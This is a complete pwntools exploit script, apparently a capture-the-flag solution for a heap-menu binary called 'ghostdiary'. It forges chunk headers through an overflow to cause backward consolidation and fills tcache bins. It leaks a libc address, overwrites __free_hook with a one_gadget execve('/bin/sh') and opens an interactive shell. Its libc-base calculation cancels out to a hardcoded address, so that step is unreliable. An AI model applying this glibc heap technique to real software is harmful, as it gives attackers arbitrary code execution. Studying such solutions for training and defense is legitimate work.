from pwn import *
#context.update(arch='amd64', os='linux', log_level='debug')

list_free = []
p = process('ghostdiary')



def addNote(size):
    p.sendlineafter('>', '1')
    if size <= 0xf0:
        p.sendlineafter('>', '1')
    elif size > 0x10f:
        p.sendlineafter('>', '2')
    else:
        print('invalid size')
        exit(0)
    p.sendlineafter(':', str(size))
    data = p.recvline()
    print('data: ' + data)
    return data.split('#')[1].replace('\x0a', '')

def writeNote(idx, contents):
    p.sendlineafter('>', '2')
    p.sendlineafter(':', str(idx))
    p.sendlineafter(':', contents)

def printNote(idx):
    p.sendlineafter('>', '3')
    p.sendlineafter(':', idx)
    p.recvuntil(':')
    data = p.recvline()
    return data

def burnNote(idx):
    p.sendlineafter('>', '4')
    p.sendlineafter(':', str(idx))

def fillTcacheAlloc(size):
    for i in range(7):
        list_free.append(addNote(size))
def fillTcacheFree():
    for x in list_free:
        burnNote(x)


idx_A = addNote(0x128)
writeNote(idx_A, 'A'*0x120+p64(0x120))

idx_B = addNote(0x118)
writeNote(idx_B, 'B'*0x118)

idx_C = addNote(0x118)
writeNote(idx_C,'C'*0xf8)

addNote(0xf0)

fillTcacheAlloc(0x128)
fillTcacheAlloc(0xf0)



#filling up tcache
fillTcacheFree()

#free A
burnNote(idx_A)


#overflow B to set inuse flag of C
writeNote(idx_B, 'B'*0x110+p64(0x120*2+0x10))

#insert fake chunk into C
writeNote(idx_C, 'C'*(0xf8)+p64(0x110-0xf8-8+1+0x10))
#free C & consolidation from A ~ C
log.info('index_C : ' + str(idx_C))
burnNote(idx_C)

fillTcacheAlloc(0x128) #empty tcache of 0x128

idx_D = addNote(0x128)
writeNote(idx_D, 'D'*0x128)



addr_bin = u64(printNote(idx_B))

temp_base = 0x00007ffff79e4000
offset_bin = addr_bin - temp_base
libc_base = addr_bin - offset_bin

log.info('libc: ' + hex(libc_base))

elf = ELF('ghostdiary')
libc = elf.libc
offset_malloc_hook = libc.symbols['__malloc_hook']
offset_free_hook = libc.symbols['__free_hook']
log.info('mallloc_hook: '+hex(offset_malloc_hook))
log.info('free_hook: '+hex(offset_free_hook))

idx_dummyBtoC = addNote(0x30)


burnNote(idx_B)
addr_malloc_hook = libc_base + offset_malloc_hook
addr_free_hook = libc_base + offset_free_hook
writeNote(idx_dummyBtoC, p64(addr_free_hook)+'z'*0x28)

addNote(0x30)
idx_overwrite = addNote(0x30)

offset_oneshot = 0x4f322
'''
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

addr_oneshot = libc_base + offset_oneshot
writeNote(idx_overwrite, p64(addr_oneshot))

burnNote(0)



p.interactive()



